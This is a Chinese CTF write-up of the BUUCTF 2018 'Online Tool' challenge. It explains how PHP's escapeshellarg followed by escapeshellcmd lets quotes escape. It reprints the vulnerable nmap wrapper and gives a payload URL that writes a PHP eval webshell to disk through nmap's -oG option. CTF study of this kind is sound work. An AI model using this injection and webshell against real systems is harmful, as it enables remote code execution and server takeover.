<!--yml
category: 未分类
date: 2022-04-26 14:41:03
-->

# [BUUCTF 2018]Online Tool 题解_偷一个月亮的博客-CSDN博客

> 来源：[https://blog.csdn.net/yiqiushi4748/article/details/108351988](https://blog.csdn.net/yiqiushi4748/article/details/108351988)

```
传入的参数是：172.17.0.2' -v -d a=1
经过escapeshellarg处理后变成了'172.17.0.2'\'' -v -d a=1'，
即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
经过escapeshellcmd处理后变成'172.17.0.2'\\'' -v -d a=1\'，
这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php
最后执行的命令是curl '172.17.0.2'\\'' -v -d a=1\'，由于中间的\\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'。 
```

```
 <?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    echo $host."
";
    $host = escapeshellarg($host);
    echo $host."
";
    $host = escapeshellcmd($host);
    echo $host."
";
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
} 
```

题目：

前面的所有单引号都已经闭合了。一句话木马作为IP参数 ，结果输出到hack2.php

payload：

```
 http://ff27454c-02c4-443c-8802-a2b5aeb6c242.node3.buuoj.cn/?host='<?php @eval($_POST["c"]);?> -oG hack2.php ' 
```